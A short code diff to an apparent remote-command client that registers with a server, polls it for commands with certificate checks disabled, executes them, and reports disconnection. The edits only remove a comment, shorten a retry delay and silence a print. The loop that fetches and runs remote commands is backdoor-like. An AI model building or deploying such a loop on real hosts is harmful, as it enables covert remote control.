@@ -23,7 +23,6 @@ def get_command():
     response = requests.get(f"{SERVER_URL}/command", params={'client_id': CLIENT_ID}, verify=False) # GET command from server
     if response.status_code == 200 and response.json().get('status') == 'sent': # if request was successful
         return response.json().get('command')
-        # return response.json()['command']
     return None
 
 def execute_command(cmd):
@@ -40,7 +39,7 @@ def main():
         try:
             CLIENT_ID = register()
         except Exception as e:
-            time.sleep(7)
+            time.sleep(1)
 
     while True:
         cmd = get_command()
@@ -48,7 +47,7 @@ def main():
             time.sleep(5)
             continue
         if cmd == "disconnect":
-            print(f"client {CLIENT_ID} disconnected")
+            # print(f"client {CLIENT_ID} disconnected")
             requests.post(SERVER_URL, params={'client_id': CLIENT_ID, 'status': 'disconnected'})
             break
         result = execute_command(cmd)
